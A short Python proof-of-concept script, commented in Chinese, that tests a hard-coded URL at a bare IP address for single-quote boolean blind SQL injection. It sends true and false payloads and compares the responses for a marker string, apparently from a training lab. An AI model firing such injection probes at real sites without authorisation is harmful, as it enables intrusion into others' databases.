"""
布尔盲注 POC
"""
import requests

def bool_verify(url):
    payload1 = "' and 1 --+"
    payload2 = "' and 0 --+"
    res1 = requests.get(url+payload1)
    res2 = requests.get(url+payload2)

    # print(res1.text)
    # print(res2.text)

    if "DongTaXueYuan" in res1.text and "DongTaXueYuan" not in res2.text:
        print('%s 存在单引号闭合的布尔盲注' % url)
    else:
        print('%s 不存在单引号闭合的布尔盲注' % url)
if __name__ == '__main__':
    url = 'http://120.25.24.45:31293/?id=1'
    bool_verify(url)


